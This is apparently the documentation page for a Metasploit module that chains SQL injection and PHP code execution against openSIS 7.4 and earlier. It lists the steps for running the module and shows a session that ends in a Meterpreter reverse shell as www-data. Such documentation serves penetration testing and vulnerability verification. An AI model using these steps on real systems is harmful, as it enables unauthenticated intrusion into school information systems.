## Vulnerable Application

This module exploits multiple vulnerabilities in [openSIS](https://www.opensis.com/) 7.4 and prior versions which could be abused by unauthenticated attackers to execute arbitrary PHP code. It is based on these advisories:

- http://karmainsecurity.com/KIS-2020-06
- http://karmainsecurity.com/KIS-2020-07
- http://karmainsecurity.com/KIS-2020-08

The module has been successfully tested against [openSIS](https://www.opensis.com/) versions 7.3 and 7.4 running on Ubuntu. Older versions might be affected as well.

Download link: https://sourceforge.net/projects/opensis-ce/files/

## Verification Steps

  1. Install the web application
  2. Start msfconsole
  3. Do: ```use unix/webapp/opensis_chain_exec```
  4. Do: ```set RHOSTS [IP]```
  5. Do: ```set TARGETURI [/path/to/opensis]```
  6. Do: ```run```
  7. You should get a shell.

## Options

### TARGETURI

The base path to the web application (e.g. `/opensis/`). The default value is `/`.

## Scenarios

**openSIS 7.4 running on Ubuntu 18.04.4**

```
msf5 > use unix/webapp/opensis_chain_exec
msf5 exploit(unix/webapp/opensis_chain_exec) > set RHOSTS localhost
msf5 exploit(unix/webapp/opensis_chain_exec) > set TARGETURI /opensis/
msf5 exploit(unix/webapp/opensis_chain_exec) > check 

[*] Retrieving session cookie
[*] Injecting malicious SQL into session variable
[*] Calling ForExport.php to set $_SESSION['_REQUEST_vars']
[*] Executing PHP code by calling Bottom.php
[+] 127.0.0.1:80 - The target is vulnerable.

msf5 exploit(unix/webapp/opensis_chain_exec) > run

[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] Retrieving session cookie
[*] Injecting malicious SQL into session variable
[*] Calling ForExport.php to set $_SESSION['_REQUEST_vars']
[*] Executing PHP code by calling Bottom.php
[*] Sending stage (38288 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:45460) at 2020-07-01 23:31:43 +0200

meterpreter > getuid 
Server username: www-data (33)
meterpreter > 
```
